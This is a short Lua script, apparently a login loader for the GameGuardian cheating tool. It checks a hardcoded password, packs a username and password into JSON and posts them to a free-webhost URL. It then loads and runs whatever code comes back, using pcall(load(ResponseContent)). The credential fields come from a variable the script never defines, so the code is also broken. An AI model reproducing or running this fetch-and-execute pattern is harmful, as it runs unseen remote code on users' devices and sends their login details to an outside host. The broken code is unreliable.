Variable = {}
Variable["https://raw.githubusercontent.com/Jfkwkfja/Osbir/main/Login.php"]= "https://testingsop1284000webhostapp.com/Login.php"
X = gg.prompt({
  "🔑password🔑: "
}, {
  [1] = ""
}, {
  [1] = "text"
})
if not X then
  return
end
if X[1] == "" then
  gg.alert("❌Password Can Not Be Empty ❌")
end
if X[1] == "osbir" then
 gg.toast("✅Password correct✅")
else
  gg.toast("wrong password 🛠️❌")
  return
end Variable["TempLogin"]  = '{"Username":"'..Prompt[1]..'","Password":"'..Prompt[2]..'"}'
gg.alert("UwU")
ResponseContent = gg.makeRequest(Variable["https://raw.githubusercontent.com/Jfkwkfja/Osbir/main/Login.php"],nil,Variable["TempLogin"]).content
pcall(load(ResponseContent))

